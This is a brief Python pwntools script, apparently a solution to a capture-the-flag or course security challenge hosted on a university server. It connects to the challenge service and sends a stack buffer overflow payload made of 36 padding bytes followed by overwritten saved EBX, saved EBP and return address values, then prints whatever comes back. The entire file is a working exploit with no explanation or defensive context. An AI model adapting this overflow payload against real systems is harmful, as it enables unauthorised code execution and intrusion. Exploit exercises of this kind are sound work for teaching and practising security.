from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25155

s = remote(SERVER, PORT, timeout=9999)

ebx_buffer_offset = 0xffffc024 - 0xffffc000  # = 36 bytes (0x24)

saved_ebx = 0x804a001
saved_ebp = 0xffffc018  
return_address = 0x80487d9

payload = b'a' * ebx_buffer_offset
payload += p32(saved_ebx)
payload += p32(saved_ebp)
payload += p32(return_address)

s.sendline(payload)
print(s.recvall())